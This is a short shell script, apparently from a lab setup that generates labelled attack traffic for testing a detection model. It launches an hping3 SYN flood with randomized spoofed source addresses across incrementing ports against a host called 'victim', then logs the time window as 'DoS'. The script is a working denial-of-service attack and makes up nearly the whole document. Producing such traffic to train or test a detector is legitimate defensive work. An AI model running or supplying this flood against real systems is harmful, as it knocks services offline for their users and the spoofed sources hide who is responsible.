#!/bin/sh
# SYN flood over many ports, from fake source addresses (a "DoS" attack the original model detects).
# Usage: synflood_random.sh [seconds] [microseconds_between_packets]    defaults 15 and 5000
. /attacks/lib.sh
DURATION="${1:-15}"
GAP="${2:-5000}"
echo "SYN flood, random ports and sources: ${DURATION}s, about $((1000000 / GAP)) packets per second"
T0=$(now)
timeout "$DURATION" hping3 -S -p ++1 --rand-source -i "u${GAP}" victim
log_window DoS synflood_random "$T0"
echo "SYN flood finished"
